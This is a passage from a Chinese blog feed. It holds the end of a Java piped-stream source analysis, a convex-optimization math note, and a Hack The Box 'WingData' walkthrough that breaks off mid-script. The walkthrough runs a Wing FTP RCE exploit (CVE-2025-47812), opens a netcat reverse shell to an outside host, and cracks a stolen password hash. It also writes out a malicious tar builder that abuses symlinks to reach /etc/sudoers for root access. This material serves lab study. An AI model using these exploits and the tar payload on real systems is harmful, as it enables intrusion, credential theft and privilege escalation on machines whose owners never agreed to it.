    //å³é­è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ï¼è¿ä¸ªPipedOutputStreamï¼çäº§èï¼ä¸è½ååä¸å®ç¸å³èçPipedInputStreamï¼æ¶è´¹èï¼ä¸­çç¼å²åºï¼byte[]æ°ç»ï¼åå¥å­èæ°æ®
    public void close()  throws IOException {
        if (sink != null) {
            sink.receivedLast();//è°ç¨PipedInputStream.class::receivedLast()å½æ°
        }
    }
}
</code></pre>
<p>PipedInputStream .classï¼æ¶è´¹èç±»ï¼çæºç </p>
<pre><code>package java.io;

public class PipedInputStream extends InputStream {
    //æ è®°ç¬¦ï¼trueè¡¨ç¤ºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼å·²ç»å³é­ï¼åä¹ï¼åä¹
    boolean closedByWriter = false;
    ...çç¥é¨åä»£ç ...
    //å³é­ä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼
    synchronized void receivedLast() {
        closedByWriter = true;//å³é­åæ¶è´¹èåä»ç¼å²åºï¼byte[]ï¼æ°ç»ä¸­è¯»åå­èæ°æ®æ¶ï¼ä¼è¿å-1ï¼ä¸ä¼æåºIOExceptionäº
        notifyAll();//å¤éæææ¶è´¹èçº¿ç¨
    }
    ...çç¥é¨åä»£ç ...
</code></pre>
<h4 id="åå¤ä¸ªçº¿ç¨åpipedoutputstreamçäº§èåå­èæ°æ®å¤ä¸ªçº¿ç¨ä»pipedinputstreamæ¶è´¹èè¯»åå­èæ°æ®çè¿ç¨">åãå¤ä¸ªçº¿ç¨åPipedOutputStreamï¼çäº§èï¼åå­èæ°æ®ï¼å¤ä¸ªçº¿ç¨ä»PipedInputStreamï¼æ¶è´¹èï¼è¯»åå­èæ°æ®çè¿ç¨</h4>
<p>ââç¥ï¼å¾è¡¥åï¼</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 22:08">2026-02-19 22:07</span>&nbsp;
<a href="https://www.cnblogs.com/Carey-ccl">Carey_ccl</a>&nbsp;
éè¯»(<span id="post_view_count">34</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19625392);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625392', targetLink: 'https://www.cnblogs.com/Carey-ccl/p/19625392', title: '9ãPipedInputStreamåPipedOutputStreamçæºç åæåä½¿ç¨æ¹æ³è¯¦ç»åæ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼äºï¼ï¼æå°å¼ç¹çå¤å®æ¡ä»¶ ]]></title>
    <link>https://www.cnblogs.com/GeophysicsWorker/p/19625407</link>
    <guid>c0fe94ca8b7703229628fea3cf885455</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GeophysicsWorker/p/19625407" title="åå¸äº 2026-02-19 22:06">
    <span role="heading" aria-level="2">å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼äºï¼ï¼æå°å¼ç¹çå¤å®æ¡ä»¶</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        å½æ°f(X)å¨å±é¨æå°å¼ç¹åºæ»¡è¶³ä»ä¹æ¡ä»¶ï¼åä¹ï¼æ»¡è¶³ä»ä¹æ¡ä»¶çæ¯å±é¨æå°ç¹?è¿å°±æ¯å¸ä¼åçåºæ¬é®é¢ãä¸é¢éå¯¹å¤åå½æ°çæå½¢ç»åºåç±»æå°å¼ç¹çå®ä¹ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>â	å½æ°<span class="math inline">\(f(\mathbf{X})\)</span> å¨å±é¨æå°å¼ç¹åºæ»¡è¶³ä»ä¹æ¡ä»¶ï¼åä¹ï¼æ»¡è¶³ä»ä¹æ¡ä»¶çæ¯å±é¨æå°ç¹?è¿å°±æ¯å¸ä¼åçåºæ¬é®é¢ãä¸é¢éå¯¹å¤åå½æ°çæå½¢ç»åºåç±»æå°å¼ç¹çå®ä¹ã</p>
<p>â	<strong>å®ä¹ 5.1</strong> å¯¹äºä»»æç»å®çå®æ°<span class="math inline">\(\forall \delta&gt;0\)</span>ï¼æ»¡è¶³ä¸ç­å¼ <span class="math inline">\(||\mathbf{X}-\mathbf{X}_0||&lt;\delta\)</span> ï¼<span class="math inline">\(\mathbf{X,X_0}\in\mathbf{R}^{n}\)</span>ï¼çéåç§°ä¸ºç¹ <span class="math inline">\(\mathbf{X}_0\)</span> çé¢åï¼è®°ä¸ºï¼</p>
<p></p><div class="math display">\[N(\mathbf{X}_0,\delta)=\{\mathbf{X}|\space||\mathbf{X}-\mathbf{X}_0||&lt;\delta,\delta&gt;0\} \tag{1}
\]</div><p></p><p>â	<strong>å®ä¹ 5.2</strong> è®¾ <span class="math inline">\(f:\mathbf{D}\subseteq\mathbf{R}^n\rightarrow\mathbf{R}\)</span>ï¼è¥å­å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\in\mathbf{D}\)</span> åæ­£æ°<span class="math inline">\(\delta&gt;0\)</span>ï¼<span class="math inline">\(\forall \mathbf{X}\in{N(\mathbf{X}^{*},\delta)}\cap\mathbf{D}\)</span> é½æ<span class="math inline">\(f(\mathbf{X}^*)\leq f(\mathbf{X})\)</span> ï¼åç§°<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸º<span class="math inline">\(f(\mathbf{X})\)</span> å±é¨æå°å¼ç¹ï¼éä¸¥æ ¼ï¼ã</p>
<p>â	<strong>å®ä¹5.3</strong>  è®¾ <span class="math inline">\(f:\mathbf{D} \subseteq{\mathbf{R}^n}\rightarrow{\mathbf{R}}\)</span> ï¼è¥å­å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\in{\mathbf{D}}\)</span>åæ­£æ°<span class="math inline">\(\delta&gt;0\)</span>ï¼<span class="math inline">\(\forall {\mathbf{X}}\in{N(\mathbf{X}^{*},\delta)}\cap\mathbf{D}\)</span> ä¸ <span class="math inline">\(\mathbf{X}\neq{\mathbf{X}^{*}}\)</span> ï¼é½æ<span class="math inline">\(f(\mathbf{X}^{*})&lt;f(\mathbf{X})\)</span> ï¼åç§°<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸º<span class="math inline">\(f(\mathbf{X})\)</span> å¨ç¹<span class="math inline">\(\mathbf{D}\)</span> çä¸¥æ ¼å±é¨æå°å¼ç¹ã</p>
<p>â	<strong>å®ä¹5.4</strong> è®¾<span class="math inline">\(f:\mathbf{D}\subseteq{\mathbf{R}^n}\rightarrow\mathbf{R}^1\)</span>ï¼è¥å­å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\in{\mathbf{D}},\forall \mathbf{X}\in{\mathbf{D}}\)</span> é½æ<span class="math inline">\(f(\mathbf{X}^{*})&lt;f(\mathbf{X})\)</span> ï¼åç§°<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸º<span class="math inline">\(f(\mathbf{X})\)</span> å¨<span class="math inline">\(\mathbf{D}\)</span> ä¸çå¨å±æå°å¼ï¼éä¸¥æ ¼ï¼ã</p>
<p>â	<strong>å®ä¹5.5</strong> è®¾<span class="math inline">\(f:\mathbf{D}\subseteq{\mathbf{R}^n\rightarrow{\mathbf{R}^1}}\)</span> ï¼è¥å­å¨ç¹ <span class="math inline">\(\mathbf{X}^{*}\in{\mathbf{D}}\)</span> ï¼<span class="math inline">\(\forall \mathbf{X}\in{\mathbf{D}}\)</span> ä½ <span class="math inline">\(\mathbf{X}\neq \mathbf{X}^*\)</span> ,é½æ<span class="math inline">\(f(\mathbf{X}^{*})&lt;f(\mathbf{X})\)</span> ï¼åç§°<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸º<span class="math inline">\(f(\mathbf{X})\)</span> å¨<span class="math inline">\(\mathbf{D}\)</span> ä¸çä¸¥æ ¼å¨å±æå°å¼ç¹ã</p>
<p>â	ç±äºä»¥ä¸å®ä¹çå°ï¼<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<strong>å±é¨æå°å¼ç¹</strong>ï¼æ¯æå¨ä»¥ä¸<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸ºä¸­å¿çä¸ä¸ªé¢åä¸­<span class="math inline">\(f(\mathbf{X})\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\)</span> å¤åå¾æå°çå¼ï¼è<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<strong>å¨å±æå°å¼ç¹</strong>ï¼æ¯æå¨å®ä¹å<span class="math inline">\(\mathbf{D}\)</span> ä¸­<span class="math inline">\(f(\mathbf{X})\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\)</span> å¤åå¾æå°çå¼ãå¨å±æå°å¼ç¹å¯è½å¨æä¸ªå±é¨æå°å¼ç¹ï¼ä¹å¯è½å¨<span class="math inline">\(\mathbf{D}\)</span> çè¾¹çä¸åå¾ã</p>
<p>â        ç±æ­¤ï¼å®éé®é¢ä¸éå¸¸æ¯æ±åå¨å±æå°å¼ç¹ï¼ä½å°ç®åä¸ºæ­¢ï¼æä¼åä¸­ç»å¤§å¤æ°æ¹æ³é½æ¯æ±å±é¨æå°å¼ç¹çï¼è§£å³è¿ä¸çç¾çä¸ç§æ¹æ³æ¯æ±åºææçå±é¨æå°å¼ç¹ï¼åæ±åºå¨å±æå°å¼ç¹ã</p>
<p>â	<strong>å® ç 5.1</strong> è®¾<span class="math inline">\(f:\mathbf{D}\subseteq {\mathbf{R}^n}\rightarrow\mathbf{R}^1\)</span> å·æè¿ç»­çä¸é¶åå¯¼æ°ãè¥<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(f(\mathbf{X})\)</span> çå±é¨æå°å¼ç¹å¹¶ä¸æ¯<span class="math inline">\(\mathbf{D}\)</span> çåç¹ï¼å</p>
<p></p><div class="math display">\[\nabla{f(\mathbf{X}^{*})}=\mathbf{0}_{n\times{1}} \tag{2}
\]</div><p></p><p><strong>è¯ æ</strong>ï¼è®¾<span class="math inline">\(\mathbf{e}\)</span> æ¯ä»»æåä½åéï¼ç±äº<span class="math inline">\(\mathbf{X}^{*}\)</span>æ¯<span class="math inline">\(f(\mathbf{X})\)</span> çå±é¨æå°å¼ç¹ï¼æä»¥å­å¨<span class="math inline">\(\delta&gt;0\)</span>ï¼å½<span class="math inline">\(|t|&lt;\delta\)</span>æ<span class="math inline">\(\mathbf{X}^{*}+t\mathbf{e}\in{N(\mathbf{X}^{*},\delta)}\)</span> æ¶æ»æ</p>
<p></p><div class="math display">\[f(\mathbf{X}^{*}+t\mathbf{e})\geq f(\mathbf{X}^{*}) \tag{3}
\]</div><p></p><p>å¼å¥è¾å©ä¸åå½æ°<span class="math inline">\(\phi(t)=f(\mathbf{X}^*+t\mathbf{e})\)</span>ï¼æ­¤æ¶ï¼ç±å¼ï¼3ï¼å¯å¾ï¼<span class="math inline">\(\phi(t)\geq\phi(0)\)</span>ã ç±äº<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(\mathbf{D}\)</span> çåç¹ï¼æä»¥ä¸å®å¯¹åºç<span class="math inline">\(t=0\)</span>æ¯<span class="math inline">\(\phi(t)\)</span> çå±é¨æå°å¼ç¹ãåæ ¹æ®ä¸åå½æ°æå°å¼ç¹çå¿è¦æ¡ä»¶ï¼å¾å°<span class="math inline">\(\phi^{\prime}(t)=0\)</span> å³å©ç¨æ¢¯åº¦æ§è´¨å¾å°<span class="math inline">\(\nabla{f(\mathbf{X})}^T\mathbf{e}=0\)</span>ãåç±åä½åé<span class="math inline">\(\mathbf{e}\)</span> çä»»ææ§å¯å¾ï¼<span class="math inline">\(\nabla{f(\mathbf{X}^{*})}=\mathbf{0}\)</span>ã</p>
<p>â	è¿éå¼ï¼2ï¼ä»ä»æ¯<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(f(\mathbf{X})\)</span> çå±é¨æå°å¼ç¹çå¿è¦æ¡ä»¶ï¼èä¸æ¯ååæ¡ä»¶ï¼ä¾å¦ <span class="math inline">\(f(x_1,x_2)=x_1x_2\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}^{*}=[0,0]^T\)</span> å¤çæ¢¯åº¦ä¸º<span class="math inline">\(\nabla{f(\mathbf{X}^*)}=[0,0]^T\)</span>, ä½æ¯<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<strong>åæ²é¢çéç¹</strong>ï¼èä¸æ¯æå°å¼ç¹ã</p>
<p>â	<strong>å® ä¹5.6</strong>  è®¾<span class="math inline">\(f:\mathbf{D}\subseteq{\mathbf{R}^{n}}\rightarrow\mathbf{R}^{1}\)</span> å·æè¿ç»­äºé¶åå¯¼æ°ï¼<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(\mathbf{D}\)</span> çä¸ä¸ªåç¹ï¼è¥<span class="math inline">\(\nabla{f(\mathbf{X^*})}=0\)</span>ï¼åç§°<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸º<span class="math inline">\(f(\mathbf{X})\)</span> <strong>é©»ç¹</strong>ã</p>
<p>â	<strong>å® ç 5.2</strong>  è®¾<span class="math inline">\(f:\mathbf{D}\subseteq{\mathbf{R}^n\rightarrow{\mathbf{R^{1}}}}\)</span> å·æè¿ç»­äºé¶åå¯¼æ°ï¼<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(\mathbf{D}\)</span> çä¸ä¸ªåç¹ï¼è¥<span class="math inline">\(\nabla{f(\mathbf{X}^{*})}=0\)</span> ,å¹¶ä¸<span class="math inline">\(\nabla^2f(\mathbf{X}^{*})\)</span>æ¯æ­£å®çï¼å<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯<span class="math inline">\(f(\mathbf{X})\)</span> çä¸¥æ ¼æå°å¼ç¹ã</p>
<p><strong>è¯ æï¼</strong> å ä¸º<span class="math inline">\(\nabla^2f(\mathbf{X}^*)\)</span> æ¯æ­£å®ç©éµï¼åå¿å­å¨<span class="math inline">\(\lambda&gt;0\)</span>,ä½¿å¾å¯¹äºææ<span class="math inline">\(\mathbf{P}\in\mathbf{R}^n\)</span>é½æ</p>
<p></p><div class="math display">\[\mathbf{P}^T\nabla^2f(\mathbf{X}^{*})\mathbf{P}&gt;\lambda||\mathbf{P}||^2 \tag{4}
\]</div><p></p><p>(å¶åçé«ç­ä»£æ°äºæ¬¡åçè®º)ãç°å¨å°<span class="math inline">\(f(\mathbf{X})\)</span>å¨ç¹<span class="math inline">\(\mathbf{X}^{*}\)</span> å¤æç§Taylor å±å¼çï¼å¹¶æ³¨æå°<span class="math inline">\(\nabla f(\mathbf{X}^*)=0\)</span>, äºæ¯å¯å¾ï¼</p>
<p></p><div class="math display">\[\begin{aligned}
f(\mathbf{X})-f(\mathbf{X}^{*})&amp;=\frac{1}{2}(\mathbf{X}-\mathbf{X^*})^T\nabla^2f(\mathbf{X}^*)(\mathbf{X}-\mathbf{X}^{*})+o(||\mathbf{X}-\mathbf{X}^{*}||^2)\\
&amp;\geq \frac{1}{2}||\mathbf{X}-\mathbf{X}^{*}||^2+o(||\mathbf{X}-\mathbf{X}^{*}||^2)
\end{aligned}
\tag{5}
\]</div><p></p><p>å½å¶<span class="math inline">\(\mathbf{X}\)</span> ååæ¥è¿<span class="math inline">\(\mathbf{X}^{*}\)</span> ï¼ä½<span class="math inline">\(\mathbf{X}\neq \mathbf{X}^{*}\)</span>ï¼ æ¶ï¼ä¸å¼å·¦ç«¯çç¬¦å·åå³äºå³ç«¯çç¬¬ä¸é¡¹ï¼å æ­¤ï¼<span class="math inline">\(f(\mathbf{X})&gt;f(\mathbf{X}^{*})\)</span> ã</p>
<p>â	ä¸è¬æ¥è¯´ï¼è¿ä¸ªå®çå·å¤çè®ºæä¹ãå ä¸ºå¯¹äºå¤æçç®æ å½æ°ï¼Hessianç©éµä¸ææ±å¾ï¼å®çæ­£å®æ§å°±æ´é¾å¤å®äºã</p>
<p>â	<strong>å®ç 5.3</strong> è¥å¤åå½æ°å¨å¶æå°ç¹å¤ç<span class="math inline">\(Hessian\)</span> ç©éµæ¯æ­£å®çï¼åå®å¨è¿ä¸ªç¹éè¿çç­å¼é¢è¿ä¼¼å°åç°ä¸ºåå¿æ¤­çé¢ç°ã</p>
<p><strong>è¯ æï¼</strong>è®¾<span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯å¤åå½æ°çæå°ç¹ï¼å¹¶è®¾<span class="math inline">\(f(\mathbf{X})=\gamma\)</span> æ¯ååé è¿æå°ç¹<span class="math inline">\(\mathbf{X}^{*}\)</span> çä¸ä¸ªç­å¼é¢ï¼å³<span class="math inline">\(||\mathbf{X}-\mathbf{X}^{*}||\)</span>ååå°ãæ<span class="math inline">\(f(\mathbf{X})\)</span> å¨<span class="math inline">\(\mathbf{X}^{*}\)</span> ç¹å±å¼Taylorè¡¨è¾¾å¼ï¼å³</p>
<p></p><div class="math display">\[\begin{aligned}
f(\mathbf{X})=f(\mathbf{X}^{*})+\nabla{f(\mathbf{X}^{*})^{T}}(\mathbf{X}-\mathbf{X}^{*})+\frac{1}{2}(\mathbf{X}-\mathbf{X}^{*})^T\nabla^2f(\mathbf{X}^*)(\mathbf{X}-\mathbf{X}^{*})+o(||\mathbf{X}-\mathbf{X}^*||^2)   
\end{aligned}
\tag{6}
\]</div><p></p><p>å³ç«¯ç¬¬äºé¡¹å <span class="math inline">\(\mathbf{X}^{*}\)</span> æ¯æå°å¼ç¹æ<span class="math inline">\(\nabla{f(\mathbf{X}^{*})}=\mathbf{0}\)</span> èæ¶å¤±ãå¦æç¥å»é«é¶å°é¡¹ï¼é£ä¹</p>
<p></p><div class="math display">\[f(\mathbf{X})\approx f(\mathbf{X}^{*})+\frac{1}{2}(\mathbf{X}-\mathbf{X}^{*})^T\nabla^2f(\mathbf{X}^{*})(\mathbf{X}-\mathbf{X}^{*})+O(||\mathbf{X}-\mathbf{X}^{*}||^2) \tag{7}
\]</div><p></p><p>åå ä¸º<span class="math inline">\(f(\mathbf{X})=\gamma\)</span> ï¼æä»¥å¾å°å¦ä¸è¿ä¼¼ç­å¼ï¼</p>
<p></p><div class="math display">\[f(\mathbf{X}^{*})+\frac{1}{2}(\mathbf{X}-\mathbf{X}^{*})^T\nabla^2f(\mathbf{X}^{*})(\mathbf{X}-\mathbf{X}^{*})=\gamma \tag{8}
\]</div><p></p><p>å¶ä¸­<span class="math inline">\(f(\mathbf{X}^{*})\)</span>ä¸ºå·²ç¥å¸¸é ï¼æ´çå¯å¾ï¼</p>
<p></p><div class="math display">\[(\mathbf{X}-\mathbf{X}^{*})^T\nabla^2f(\mathbf{X}^{*})(\mathbf{X}-\mathbf{X}^{*})=2(\gamma-f(\mathbf{X}^{*}))=constant \tag{9}
\]</div><p></p><p>æåè®¾<span class="math inline">\(\nabla^2f(\mathbf{X}^{*})\)</span> æ­£å®ï¼ç±äºæ¬¡åçè®ºå¯ç¥ï¼å¼ï¼9ï¼æ¯ä»¥<span class="math inline">\(\mathbf{X}^{*}\)</span> ä¸ºä¸­å¿çæ¤­çé¢æ¹ç¨ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 22:06">2026-02-19 22:06</span>&nbsp;
<a href="https://www.cnblogs.com/GeophysicsWorker">GeoFXR</a>&nbsp;
éè¯»(<span id="post_view_count">50</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19625407);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625407', targetLink: 'https://www.cnblogs.com/GeophysicsWorker/p/19625407', title: 'å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼äºï¼ï¼æå°å¼ç¹çå¤å®æ¡ä»¶' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp ]]></title>
    <link>https://www.cnblogs.com/DSchenzi/p/19625276</link>
    <guid>7c7087de627cf6a2a01a9d74085b7941</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19625276" title="åå¸äº 2026-02-19 20:05">
    <span role="heading" aria-level="2">ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="wingdata">WingData</h1>
<h2 id="ä¿¡æ¯æ¶é">ä¿¡æ¯æ¶é</h2>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200443486-1691206510.png" alt="image-20260219182401835" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444147-1082259586.png" alt="image-20260219182537800" loading="lazy"></p>
<p>å¾å°ä¸ä¸ªftp.wingdata.htbï¼ä¹å°è¿ä¸ªå ä¸</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444607-2041651593.png" alt="image-20260219182636761" loading="lazy"></p>
<p>Wing FTP Server v7.4.3</p>
<p>éè¿æå¯»cveæ¯ CVE-2025-47812</p>
<h2 id="æ¼æ´å©ç¨cve-2025-47812">æ¼æ´å©ç¨ï¼CVE-2025-47812ï¼</h2>
<p><a href="https://github.com/4m3rr0r/CVE-2025-47812-poc" target="_blank" rel="noopener nofollow">4m3rr0r/CVE-2025-47812-poc: Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812)</a></p>
<pre><code class="language-kotlin">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami" -v
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444925-1620471614.png" alt="image-20260219183211504" loading="lazy"></p>
<p><strong>ç¶ååå¼¹shell</strong></p>
<pre><code class="language-kotlin">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.16.5 8888 -e /bin/sh" -v

python3 -c 'import pty;pty.spawn("/bin/bash")'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445289-1452625655.png" alt="image-20260219183719631" loading="lazy"></p>
<p>ç¶åå¨<code>/opt/wftpserver/Data/1/users</code>ä¸çwacky.xmlè·å¾ç¨æ·å å¯å­æ®</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445708-1521256185.png" alt="image-20260219184040177" loading="lazy"></p>
<pre><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
</code></pre>
<p><strong>çç ´hash(WingFTP ä½¿ç¨SHA256ç®æ³ï¼å¹¶ä½¿ç¨çå¼âWingFTPâä¸ºå å¯æ¹å¼)</strong></p>
<pre><code class="language-kotlin">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446045-1809595022.png" alt="image-20260219184927089" loading="lazy"></p>
<p>å¾å°å¯ç <code>!#7Blushing^*Bride5</code></p>
<p>wacky/c</p>
<p><strong>ç¶åsshè¿æ¥</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446347-1318255688.png" alt="image-20260219185219510" loading="lazy"></p>
<p>å¾å°user.txt</p>
<h2 id="æéæå">æéæå</h2>
<p>åsudo -lçä¸ä¸</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446644-1829574816.png" alt="image-20260219185311322" loading="lazy"></p>
<p>å¯ä»¥çå°æä¸ä¸ªpyèæ¬</p>
<p>æä»¬å»çä¸ä¸</p>
<pre><code>cat /opt/backup_clients/restore_backup_clients.py
</code></pre>
<pre><code class="language-python">#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, "
             "where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1â24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1â24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
</code></pre>
<p>æä»¬å©ç¨è¿ä¸ªèæ¬çætaræä»¶</p>
<pre><code class="language-python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
çææ¶ætaræä»¶çæ¼æ´å©ç¨èæ¬
ä½ç¨ï¼æé åå«å¤å±ç®å½ãç¬¦å·é¾æ¥çtaræä»¶ï¼å°è¯çªç ´è·¯å¾éå¶åå¥/etc/sudoers
"""

import tarfile
import os
import io
import sys

def create_malicious_tar(output_path="/tmp/backup_9999.tar"):
    """
    åå»ºæ¶ætaræä»¶ï¼åå«è·¯å¾éååç¬¦å·é¾æ¥çæé 
    
    Args:
        output_path: çæçtaræä»¶ä¿å­è·¯å¾ï¼é»è®¤/tmp/backup_9999.tar
    """
    # æé é¿ç®å½åï¼247ä¸ªdï¼ï¼ç¨äºçªç ´è·¯å¾é¿åº¦éå¶
    long_dir_name = 'd' * 247
    # ç¨äºæé å¤å±ç®å½çå­ç¬¦åºå
    step_chars = "abcdefghijklmnop"
    current_path = ""

    try:
        # ä»¥åæ¨¡å¼æå¼taræä»¶
        with tarfile.open(output_path, mode="w") as tar:
            # å¾ªç¯æé å¤å±ç®å½åç¬¦å·é¾æ¥
            for char in step_chars:
                # 1. åå»ºé¿ç®å½åçç®å½é¡¹
                dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))
                dir_info.type = tarfile.DIRTYPE  # æ è®°ä¸ºç®å½ç±»å
                tar.addfile(dir_info)

                # 2. åå»ºæåè¯¥é¿ç®å½çç¬¦å·é¾æ¥
                symlink_info = tarfile.TarInfo(os.path.join(current_path, char))
                symlink_info.type = tarfile.SYMTYPE  # æ è®°ä¸ºç¬¦å·é¾æ¥ç±»å
                symlink_info.linkname = long_dir_name  # é¾æ¥æåé¿ç®å½
                tar.addfile(symlink_info)

                # æ´æ°å½åè·¯å¾ï¼è¿å¥ä¸ä¸å±
                current_path = os.path.join(current_path, long_dir_name)

            # 3. æé å¤å±ç¬¦å·é¾æ¥è·¯å¾ï¼ç¨äºè·¯å¾éå
            link_path = os.path.join("/".join(step_chars), "l"*254)
            link_info = tarfile.TarInfo(link_path)
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "../" * len(step_chars)  # æé åéè·¯å¾
            tar.addfile(link_info)

            # 4. åå»ºæå/etcç®å½çç¬¦å·é¾æ¥ï¼escapeï¼
            escape_info = tarfile.TarInfo("escape")
            escape_info.type = tarfile.SYMTYPE
            escape_info.linkname = f"{link_path}/../../../../../../../etc"
            tar.addfile(escape_info)

            # 5. åå»ºæå/etc/sudoersçç¡¬é¾æ¥ï¼sudoers_linkï¼
            sudoers_link_info = tarfile.TarInfo("sudoers_link")
            sudoers_link_info.type = tarfile.LNKTYPE
            sudoers_link_info.linkname = "escape/sudoers"
            tar.addfile(sudoers_link_info)

